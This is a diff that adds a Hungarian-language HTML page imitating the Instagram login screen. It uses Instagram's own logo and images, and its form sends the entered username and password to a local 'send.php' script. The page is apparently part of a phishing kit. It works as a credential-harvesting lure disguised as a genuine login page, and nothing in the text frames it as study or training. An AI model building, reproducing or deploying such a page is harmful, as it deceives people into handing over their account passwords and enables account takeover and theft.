@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            display: flex;
+            max-width: 935px;
+            align-items: center;
+        }
+        .phone-image {
+            flex: 1;
+            margin-right: 32px;
+        }
+        .phone-image img {
+            max-width: 100%;
+            height: auto;
+        }
+        .login-box {
+            flex: 0.6;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            border-radius: 1px;
+        }
+        .login-box .logo {
+            width: 175px;
+            margin: 20px 0;
+        }
+        .login-box input {
+            width: 85%;
+            padding: 9px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+        .login-box button {
+            width: 90%;
+            padding: 7px;
+            margin: 10px 0;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .login-box button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+        .login-box p {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .login-box a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="phone-image">
+            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/1fabae5a6e5a.png" alt="Instagram Phone">
+        </div>
+        <div class="login-box">
+            <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+            <form action="send.php" method="POST">
+                <input type="text" name="username" placeholder="Felhasználónév" required>
+                <input type="password" name="password" placeholder="Jelszó" required>
+                <button type="submit">Bejelentkezés</button>
+            </form>
+            <p>Elfelejtetted a jelszavad? <a href="#">Segítség kérése</a></p>
+        </div>
+    </div>
+</body>
+</html>
